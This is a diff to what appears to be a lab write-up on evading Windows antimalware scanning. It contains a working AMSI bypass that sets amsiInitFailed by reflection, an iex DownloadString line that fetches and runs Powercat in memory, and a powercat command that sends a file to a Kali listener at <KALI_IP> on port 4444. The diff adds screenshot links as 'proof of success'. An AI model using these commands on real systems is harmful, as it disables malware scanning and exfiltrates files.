@@ -13,7 +13,7 @@ $type.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
 
 # Step 2: Loading Powercat
 # Once patched, Powercat was loaded in-memory:
-#iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+# iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
 # Step 3: Data Exfiltration (Kali & Windows):
     # On Kali Linux (Receiver):
@@ -21,3 +21,12 @@ $type.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
 
     # On Windows (Sender):
     powercat -c <KALI_IP> -p 4444 -i C:\path\to\file.exe
+## 📸 Proof of Success
+
+### 1. AMSI Bypass & Tool Loading
+![AMSI Bypass Success](screenshots/windows_bypass.png)
+
+
+### 2. Connection & Data Received
+![Kali Connection Success](screenshots/kali_success.png)
+
